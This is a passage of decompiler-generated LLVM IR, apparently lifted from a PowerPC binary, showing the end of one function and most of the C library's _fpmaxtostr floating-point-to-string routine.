  %v4_100102d8 = inttoptr i32 %v3_100102d8 to i8*
  store i8 45, i8* %v4_100102d8, align 1
  store i32 %v3_100102d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102dc

dec_label_pc_100102dc:                            ; preds = %dec_label_pc_100102cc.dec_label_pc_100102dc_crit_edge, %dec_label_pc_100102d4
  %v0_100102e4 = phi i32 [ %v0_100102e4.pre, %dec_label_pc_100102cc.dec_label_pc_100102dc_crit_edge ], [ %v3_100102d8, %dec_label_pc_100102d4 ]
  ret i32 %v0_100102e4

; uselistorder directives
  uselistorder i32 %v2_1001025c, { 1, 2, 0 }
  uselistorder i32 %v2_10010254, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10010298, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10010234, { 1, 2, 0 }
  uselistorder i32 %v0_10010234, { 1, 0 }
  uselistorder i32 %v0_100101f0, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_100102dc, { 1, 0 }
  uselistorder label %dec_label_pc_100102a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001024c, { 1, 0 }
  uselistorder label %dec_label_pc_10010224, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_100102e8 = load i32, i32* @lr, align 4
  store i32 %v0_100102e8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10010304 = add i32 %tmp, 11
  %v2_10010304 = inttoptr i32 %v1_10010304 to i8*
  %v3_10010304 = load i8, i8* %v2_10010304, align 1
  %v4_10010304 = zext i8 %v3_10010304 to i32
  store i32 %v4_10010304, i32* %r31.global-to-local, align 4
  %v1_10010308 = or i32 %v4_10010304, 32
  %v1_1001030c = icmp ult i32 %v1_10010308, 97
  %v3_1001030c = icmp eq i32 %v1_10010308, 97
  store i1 %v1_1001030c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001030c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10010318 = add i32 %tmp, 4
  %v2_10010318 = inttoptr i32 %v1_10010318 to i32*
  %v3_10010318 = load i32, i32* %v2_10010318, align 4
  store i32 %v3_10010318, i32* %r28.global-to-local, align 4
  %v2_1001031c = load i32, i32* %arg2, align 4
  store i32 %v2_1001031c, i32* %r30.global-to-local, align 4
  br i1 %v3_1001030c, label %dec_label_pc_10010324, label %dec_label_pc_1001032c

dec_label_pc_10010324:                            ; preds = %entry
  %v1_10010324 = add nuw nsw i32 %v4_10010304, 6
  store i32 %v1_10010324, i32* %r0.global-to-local, align 4
  %v1_10010328 = urem i32 %v1_10010324, 256
  store i32 %v1_10010328, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001032c

dec_label_pc_1001032c:                            ; preds = %entry, %dec_label_pc_10010324
  %v0_100103e0 = phi i32 [ %v4_10010304, %entry ], [ %v1_10010328, %dec_label_pc_10010324 ]
  %v1_1001032c = icmp slt i32 %v2_1001031c, 0
  %v3_1001032c = icmp eq i32 %v2_1001031c, 0
  store i1 %v1_1001032c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001032c, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1001031c, -1
  br i1 %tmp75, label %dec_label_pc_10010338, label %dec_label_pc_10010334

dec_label_pc_10010334:                            ; preds = %dec_label_pc_1001032c
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010338

dec_label_pc_10010338:                            ; preds = %dec_label_pc_1001032c, %dec_label_pc_10010334
  %v0_100104f044 = phi i32 [ %v2_1001031c, %dec_label_pc_1001032c ], [ 6, %dec_label_pc_10010334 ]
  %v1_10010338 = add i32 %tmp, 12
  %v2_10010338 = inttoptr i32 %v1_10010338 to i32*
  %v3_10010338 = load i32, i32* %v2_10010338, align 4
  store i32 %v3_10010338, i32* %r9.global-to-local, align 4
  %v1_1001033c = and i32 %v3_10010338, 2
  %v3_1001033c = icmp eq i32 %v1_1001033c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1001033c, label %dec_label_pc_10010354, label %dec_label_pc_10010360

dec_label_pc_10010354:                            ; preds = %dec_label_pc_10010338
  %v1_10010354 = urem i32 %v3_10010338, 2
  store i32 %v1_10010354, i32* @r7, align 4
  %v3_10010354 = icmp eq i32 %v1_10010354, 0
  br i1 %v3_10010354, label %dec_label_pc_10010364, label %dec_label_pc_10010360

dec_label_pc_10010360:                            ; preds = %dec_label_pc_10010354, %dec_label_pc_10010338
  %storemerge = phi i32 [ 43, %dec_label_pc_10010338 ], [ 32, %dec_label_pc_10010354 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10010360 = trunc i32 %storemerge to i8
  store i8 %v6_10010360, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10010364

dec_label_pc_10010364:                            ; preds = %dec_label_pc_10010354, %dec_label_pc_10010360
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1001032c, label %dec_label_pc_100104c8, label %dec_label_pc_100103e0

dec_label_pc_100103e0:                            ; preds = %dec_label_pc_10010364
  %v1_100103e0 = icmp ult i32 %v0_100103e0, 96
  %v2_100103e0 = icmp ugt i32 %v0_100103e0, 96
  %v3_100103e0 = icmp eq i32 %v0_100103e0, 96
  store i1 %v1_100103e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100103e0, i1* %cr7_eq.global-to-local, align 1
  %v2_100103e8 = add i32 %tmp, 16
  %v3_100103e8 = inttoptr i32 %v2_100103e8 to i32*
  store i32 32, i32* %v3_100103e8, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_100103e0, label %dec_label_pc_1001040c, label %dec_label_pc_10010400

dec_label_pc_10010400:                            ; preds = %dec_label_pc_100103e0
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001040c

dec_label_pc_1001040c:                            ; preds = %dec_label_pc_100103e0, %dec_label_pc_10010400
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1001d800.915 to i32), i32 8), %dec_label_pc_100103e0 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1001d800.915 to i32), i32 12), %dec_label_pc_10010400 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001d800.915 to i32), i32* %r9.global-to-local, align 4
  %v2_10010418 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10010418, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100108b8

dec_label_pc_100104c8:                            ; preds = %dec_label_pc_10010364
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_100104cc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_100104cc, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10010518 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_100104ec

dec_label_pc_100104ec:                            ; preds = %dec_label_pc_1001056c.dec_label_pc_100104ec_crit_edge, %dec_label_pc_100104c8
  %v0_100104f0 = phi i32 [ %v0_100104f0.pre, %dec_label_pc_1001056c.dec_label_pc_100104ec_crit_edge ], [ %v0_100104f044, %dec_label_pc_100104c8 ]
  %v3_100104f0 = call %1 @__asm_cror(i32 %v0_100104f0, i32 %tmp, i32 %v0_100104f0)
  %v11_100104f0 = extractvalue %1 %v3_100104f0, 7
  store i4 %v11_100104f0, i4* @cr4, align 1
  %v0_100104f4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100104f4, label %dec_label_pc_10010508, label %dec_label_pc_1001051c

dec_label_pc_10010508:                            ; preds = %dec_label_pc_100104ec
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001051c

dec_label_pc_1001051c:                            ; preds = %dec_label_pc_100104ec, %dec_label_pc_10010508
  %storemerge2 = phi i32 [ %v1_10010518, %dec_label_pc_10010508 ], [ %tmp55, %dec_label_pc_100104ec ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1001052c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001052c = add i32 %v0_1001052c, 9
  store i32 %v1_1001052c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010548

dec_label_pc_10010548:                            ; preds = %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge, %dec_label_pc_1001051c
  %v1_10010550 = phi i32 [ %v1_10010550.pre, %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge ], [ %v1_1001052c, %dec_label_pc_1001051c ]
  %v0_1001054c = phi i32 [ %v0_1001054c.pre, %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge ], [ 0, %dec_label_pc_1001051c ]
  %v1_10010548 = phi i32 [ %v1_10010548.pre, %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge ], [ 10, %dec_label_pc_1001051c ]
  %v1_10010558 = phi i32 [ %v0_10010548.pre, %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge ], [ %storemerge2, %dec_label_pc_1001051c ]
  %v2_10010548 = udiv i32 %v1_10010558, %v1_10010548
  store i32 %v2_10010548, i32* %r0.global-to-local, align 4
  %v1_1001054c = add i32 %v0_1001054c, 1
  store i32 %v1_1001054c, i32* %r8.global-to-local, align 4
  %v2_10010550 = sub i32 %v1_10010550, %v1_1001054c
  store i32 %v2_10010550, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10010548, -10
  store i32 %v2_10010548, i32* %r10.global-to-local, align 4
  %v2_10010558 = add i32 %v1_10010558, 48
  %v1_10010560 = add i32 %v2_10010558, %tmp76
  store i32 %v1_10010560, i32* %r9.global-to-local, align 4
  %v1_10010564 = trunc i32 %v1_10010560 to i8
  %v3_10010564 = inttoptr i32 %v2_10010550 to i8*
  store i8 %v1_10010564, i8* %v3_10010564, align 1
  %v0_10010568 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010568 = add i32 %v0_10010568, -1
  store i32 %v1_10010568, i32* %ctr.global-to-local, align 4
  %v2_10010568 = icmp eq i32 %v1_10010568, 0
  br i1 %v2_10010568, label %dec_label_pc_1001056c, label %dec_label_pc_10010548.dec_label_pc_10010548_crit_edge

dec_label_pc_10010548.dec_label_pc_10010548_crit_edge: ; preds = %dec_label_pc_10010548
  %v0_10010548.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10010548.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1001054c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10010550.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010548

dec_label_pc_1001056c:                            ; preds = %dec_label_pc_10010548
  %v0_1001056c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001056c = icmp slt i32 %v0_1001056c, 0
  %v3_1001056c = icmp eq i32 %v0_1001056c, 0
  store i1 %v1_1001056c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001056c, i1* %cr7_eq.global-to-local, align 1
  %v1_10010570 = add i32 %v0_1001056c, 1
  store i32 %v1_10010570, i32* %r7.global-to-local, align 4
  br i1 %v3_1001056c, label %dec_label_pc_1001056c.dec_label_pc_100104ec_crit_edge, label %dec_label_pc_10010578

dec_label_pc_1001056c.dec_label_pc_100104ec_crit_edge: ; preds = %dec_label_pc_1001056c
  %v0_100104f0.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100104ec

dec_label_pc_10010578:                            ; preds = %dec_label_pc_1001056c
  %v0_10010578 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010578 = icmp ult i32 %v0_10010578, 96
  %v2_10010578 = icmp ugt i32 %v0_10010578, 96
  %v3_10010578 = icmp eq i32 %v0_10010578, 96
  store i1 %v1_10010578, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010578, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10010578, label %dec_label_pc_10010590, label %dec_label_pc_10010580

dec_label_pc_10010580:                            ; preds = %dec_label_pc_10010578
  %v1_10010588 = add i32 %v0_10010578, 32
  store i32 %v1_10010588, i32* %r0.global-to-local, align 4
  %v1_1001058c = urem i32 %v1_10010588, 256
  store i32 %v1_1001058c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010590

dec_label_pc_10010590:                            ; preds = %dec_label_pc_10010578, %dec_label_pc_10010580
  %v0_100105a8 = phi i32 [ %v1_1001058c, %dec_label_pc_10010580 ], [ %v0_10010578, %dec_label_pc_10010578 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10010580 ], [ 101, %dec_label_pc_10010578 ]
  %v1_10010590 = icmp slt i32 %v0_100105a8, 103
  %v3_10010590 = icmp eq i32 %v0_100105a8, 103
  store i1 %v1_10010590, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010590, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010590, label %dec_label_pc_10010598, label %dec_label_pc_100105a8

dec_label_pc_10010598:                            ; preds = %dec_label_pc_10010590
  %v0_10010598 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010598 = icmp slt i32 %v0_10010598, 0
  %v3_10010598 = icmp eq i32 %v0_10010598, 0
  store i1 %v1_10010598, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010598, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010598, label %dec_label_pc_100105b0, label %dec_label_pc_100105a0

dec_label_pc_100105a0:                            ; preds = %dec_label_pc_10010598
  %v1_100105a0 = add i32 %v0_10010598, -1
  store i32 %v1_100105a0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100105b0

dec_label_pc_100105a8:                            ; preds = %dec_label_pc_10010590
  %v1_100105a8 = icmp slt i32 %v0_100105a8, 102
  %v3_100105a8 = icmp eq i32 %v0_100105a8, 102
  store i1 %v1_100105a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100105a8, i1* %cr7_eq.global-to-local, align 1
  %v0_100105b8 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_100105a8, label %dec_label_pc_100105b8, label %dec_label_pc_100105b0

dec_label_pc_100105b0:                            ; preds = %dec_label_pc_100105a8, %dec_label_pc_10010598, %dec_label_pc_100105a0
  %v0_100105b0 = phi i32 [ 0, %dec_label_pc_10010598 ], [ %v1_100105a0, %dec_label_pc_100105a0 ], [ %v0_100105b8, %dec_label_pc_100105a8 ]
  store i32 %v0_100105b0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105b8:                            ; preds = %dec_label_pc_100105a8
  %v1_100105b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_100105b8 = add i32 %v1_100105b8, %v0_100105b8
  store i32 %v2_100105b8, i32* %r10.global-to-local, align 4
  %v1_100105bc = icmp slt i32 %v2_100105b8, -1
  %v3_100105bc = icmp eq i32 %v2_100105b8, -1
  store i1 %v1_100105bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100105bc, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_100105b8, -2
  br i1 %tmp77, label %dec_label_pc_100105dc, label %dec_label_pc_100105c4

dec_label_pc_100105c4:                            ; preds = %dec_label_pc_100105b8
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_100105c8 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_100105c8, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268502484, i32* @lr, align 4
  %v3_100105d0 = call i32 @__GI_memset(i32 %v2_100105c8, i32 48, i32 17)
  store i32 %v3_100105d0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105dc:                            ; preds = %dec_label_pc_100105b8, %dec_label_pc_100105b0, %dec_label_pc_100105c4
  %v1_10010600 = phi i32 [ %v2_100105b8, %dec_label_pc_100105b8 ], [ %v0_100105b0, %dec_label_pc_100105b0 ], [ -1, %dec_label_pc_100105c4 ]
  %v1_100105dc = icmp slt i32 %v1_10010600, 16
  %v2_100105dc = icmp sgt i32 %v1_10010600, 16
  %v3_100105dc = icmp eq i32 %v1_10010600, 16
  store i1 %v1_100105dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100105dc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_100105f0 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_100105f0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_100105dc, label %dec_label_pc_10010618, label %dec_label_pc_100105fc

dec_label_pc_100105fc:                            ; preds = %dec_label_pc_100105dc
  %v2_100105fc = ptrtoint i32* %stack_var_-177 to i32
  %v2_10010600 = add i32 %v1_10010600, %v2_100105fc
  store i32 %v2_10010600, i32* %r9.global-to-local, align 4
  %v1_10010604 = add i32 %v2_10010600, 2
  %v2_10010604 = inttoptr i32 %v1_10010604 to i8*
  %v3_10010604 = load i8, i8* %v2_10010604, align 1
  %v4_10010604 = zext i8 %v3_10010604 to i32
  store i32 %v4_10010604, i32* %r0.global-to-local, align 4
  store i32 %v1_10010604, i32* %r11.global-to-local, align 4
  %v1_1001060c = sub nsw i32 52, %v4_10010604
  %v2_1001060c = sub nuw nsw i32 -1, %v4_10010604
  %not.v5_1001060c = icmp ugt i32 %v1_1001060c, %v2_1001060c
  %v1_10010614 = zext i1 %not.v5_1001060c to i32
  store i32 %v1_10010614, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010618

dec_label_pc_10010618:                            ; preds = %dec_label_pc_100105dc, %dec_label_pc_100105fc, %dec_label_pc_10010618.backedge
  %v0_1001061c = phi i32 [ %v0_1001061c.pre, %dec_label_pc_10010618.backedge ], [ 0, %dec_label_pc_100105dc ], [ %v1_10010614, %dec_label_pc_100105fc ]
  %v0_10010618 = phi i32 [ %v0_10010618.pre, %dec_label_pc_10010618.backedge ], [ %v2_100105f0, %dec_label_pc_100105dc ], [ %v1_10010604, %dec_label_pc_100105fc ]
  %v1_10010618 = add i32 %v0_10010618, -1
  %v2_10010618 = inttoptr i32 %v1_10010618 to i8*
  %v3_10010618 = load i8, i8* %v2_10010618, align 1
  %v4_10010618 = zext i8 %v3_10010618 to i32
  store i32 %v1_10010618, i32* %r11.global-to-local, align 4
  %v2_1001061c = add i32 %v4_10010618, %v0_1001061c
  store i32 %v2_1001061c, i32* %r0.global-to-local, align 4
  %v1_10010620 = urem i32 %v2_1001061c, 256
  store i32 %v1_10010620, i32* %r9.global-to-local, align 4
  %v1_10010624 = trunc i32 %v2_1001061c to i8
  store i8 %v1_10010624, i8* %v2_10010618, align 1
  %v0_10010628 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010628 = icmp slt i32 %v0_10010628, 48
  %v3_10010628 = icmp eq i32 %v0_10010628, 48
  store i1 %v1_10010628, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010628, i1* %cr7_eq.global-to-local, align 1
  %v1_1001062c = icmp ult i32 %v0_10010628, 57
  %v2_1001062c = icmp ugt i32 %v0_10010628, 57
  %v3_1001062c = icmp eq i32 %v0_10010628, 57
  store i1 %v1_1001062c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1001062c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1001062c, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10010628, %v2_1001062c
  br i1 %brmerge, label %dec_label_pc_10010618.backedge, label %dec_label_pc_10010638

dec_label_pc_10010618.backedge:                   ; preds = %dec_label_pc_10010618
  %v0_10010618.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001061c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010618

dec_label_pc_10010638:                            ; preds = %dec_label_pc_10010618
  %v2_10010638 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10010638, i32* %r0.global-to-local, align 4
  %v0_1001063c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1001063c, i32* @r7, align 4
  %v0_10010640 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010640 = icmp ult i32 %v0_10010640, %v2_10010638
  %v3_10010640 = icmp ugt i32 %v0_10010640, %v2_10010638
  %v4_10010640 = icmp eq i32 %v0_10010640, %v2_10010638
  store i1 %v2_10010640, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010640, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_100104cc, i32* %r8.global-to-local, align 4
  br i1 %v3_10010640, label %dec_label_pc_10010658, label %dec_label_pc_1001064c

dec_label_pc_1001064c:                            ; preds = %dec_label_pc_10010638
  store i32 %v2_10010638, i32* %r8.global-to-local, align 4
  %v1_10010650 = add i32 %v0_1001063c, 1
  store i32 %v1_10010650, i32* @r7, align 4
  store i32 %v2_10010638, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010658

dec_label_pc_10010658:                            ; preds = %dec_label_pc_10010638, %dec_label_pc_1001064c
  %v2_10010660 = phi i32 [ %v0_10010640, %dec_label_pc_10010638 ], [ %v2_10010638, %dec_label_pc_1001064c ]
  %v0_10010658 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010658 = icmp slt i32 %v0_10010658, 103
  %v3_10010658 = icmp eq i32 %v0_10010658, 103
  store i1 %v1_10010658, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010658, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10010660 = add i32 %v2_10010660, 1
  %v4_10010660 = inttoptr i32 %v3_10010660 to i8*
  store i8 0, i8* %v4_10010660, align 1
  %v0_10010664 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010664 = add i32 %v0_10010664, 1
  store i32 %v1_10010664, i32* %r9.global-to-local, align 4
  %v0_10010668 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10010668, label %dec_label_pc_1001066c, label %dec_label_pc_10010690

dec_label_pc_1001066c:                            ; preds = %dec_label_pc_10010658
  %v0_1001066c = load i32, i32* @r7, align 4
  %v1_1001066c = icmp slt i32 %v0_1001066c, -4
  %v3_1001066c = icmp eq i32 %v0_1001066c, -4
  store i1 %v1_1001066c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001066c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1001066c, label %dec_label_pc_10010688, label %dec_label_pc_10010674

dec_label_pc_10010674:                            ; preds = %dec_label_pc_1001066c
  %v1_10010674 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010674 = icmp sgt i32 %v1_10010674, %v0_1001066c
  %v3_10010674 = icmp slt i32 %v1_10010674, %v0_1001066c
  %v4_10010674 = icmp eq i32 %v1_10010674, %v0_1001066c
  store i1 %v2_10010674, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010674, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010674, label %dec_label_pc_10010688, label %dec_label_pc_1001067c

dec_label_pc_1001067c:                            ; preds = %dec_label_pc_10010674
  %v2_1001067c = sub i32 %v1_10010674, %v0_1001066c
  store i32 %v2_1001067c, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100106a8

dec_label_pc_10010688:                            ; preds = %dec_label_pc_10010674, %dec_label_pc_1001066c
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001069c

dec_label_pc_10010690:                            ; preds = %dec_label_pc_10010658
  %v0_10010690 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010690 = icmp slt i32 %v0_10010690, 102
  %v3_10010690 = icmp eq i32 %v0_10010690, 102
  store i1 %v1_10010690, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010690, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10010690, i32* %r4.global-to-local, align 4
  br i1 %v3_10010690, label %dec_label_pc_100106a8thread-pre-split, label %dec_label_pc_1001069c

dec_label_pc_1001069c:                            ; preds = %dec_label_pc_10010690, %dec_label_pc_10010688
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_100106bc

dec_label_pc_100106a8thread-pre-split:            ; preds = %dec_label_pc_10010690
  %v0_100106a8.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_100106a8

dec_label_pc_100106a8:                            ; preds = %dec_label_pc_100106a8thread-pre-split, %dec_label_pc_1001067c
  %v0_100106ac = phi i32 [ %v0_100106a8.pr, %dec_label_pc_100106a8thread-pre-split ], [ %v0_1001066c, %dec_label_pc_1001067c ]
  %v1_100106a8 = icmp slt i32 %v0_100106ac, 0
  %v2_100106a8 = icmp sgt i32 %v0_100106ac, 0
  %v3_100106a8 = icmp eq i32 %v0_100106ac, 0
  store i1 %v1_100106a8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100106a8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100106a8, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_100106ac, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_100106ac, -1
  br i1 %tmp78, label %dec_label_pc_100106bc, label %dec_label_pc_100106b4

dec_label_pc_100106b4:                            ; preds = %dec_label_pc_100106a8
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_100106b8 = load i32, i32* %r8.global-to-local, align 4
  %v3_100106b8 = add i32 %v2_100106b8, -1
  %v4_100106b8 = inttoptr i32 %v3_100106b8 to i8*
  store i8 48, i8* %v4_100106b8, align 1
  store i32 %v3_100106b8, i32* %r8.global-to-local, align 4
  %v1_100106d8.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100106ec.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_100106bc

dec_label_pc_100106bc:                            ; preds = %dec_label_pc_100106a8, %dec_label_pc_1001069c, %dec_label_pc_100106b4
  %v0_100106ec = phi i1 [ %v1_100106a8, %dec_label_pc_100106a8 ], [ false, %dec_label_pc_1001069c ], [ %v0_100106ec.pre, %dec_label_pc_100106b4 ]
  %v1_100106d8 = phi i32 [ %v1_10010664, %dec_label_pc_100106a8 ], [ %v1_10010664, %dec_label_pc_1001069c ], [ %v1_100106d8.pre, %dec_label_pc_100106b4 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_100106c8 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_100106c8, i32* %r0.global-to-local, align 4
  %v0_100106d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100106d0 = add i32 %v0_100106d0, 1
  store i32 %v1_100106d0, i32* %r6.global-to-local, align 4
  %v2_100106d8 = sub i32 %v1_100106d8, %v1_100106d0
  store i32 %v2_100106d8, i32* %r11.global-to-local, align 4
  %v1_100106dc = inttoptr i32 %v0_100106d0 to i8*
  %v2_100106dc = load i8, i8* %v1_100106dc, align 1
